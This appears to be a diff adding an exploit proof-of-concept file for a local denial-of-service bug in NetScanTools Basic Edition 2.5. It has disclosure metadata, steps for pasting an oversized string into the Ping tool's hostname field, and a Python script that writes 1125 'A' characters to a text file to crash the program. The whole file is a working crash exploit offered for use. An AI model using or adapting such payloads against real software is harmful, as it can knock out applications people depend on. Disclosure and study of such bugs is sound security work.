@@ -1,0 +1,25 @@
+# Exploit Title: NetScanTools Basic Edition 2.5 - 'Hostname' Denial of Service (PoC)
+# Discovery by: Luis Martínez
+# Discovery Date: 2018-07-26
+# Vendor Homepage: https://www.netscantools.com/
+# Software Link : http://download.netscantools.com/nstb250.zip
+# Tested Version: 2.5
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Steps to Produce the Crash: 
+# 1.- Run python code : python NetScanTools_Basic_Edition_2.5.py
+# 2.- Open NetScanTools_Basic_Edition_2.5.txt and copy content to clipboard
+# 3.- Open NstBasic.exe
+# 4.- Ping and Traceroute Tools
+# 5.- Ping
+# 6.- Paste ClipBoard on Target Hostname or IPv4 Address
+# 7.- Do Ping
+# 8.- Crashed
+
+#!/usr/bin/env python
+ 
+buffer = "\x41" * 1125
+f = open ("NetScanTools_Basic_Edition_2.5.txt", "w")
+f.write(buffer)
+f.close()
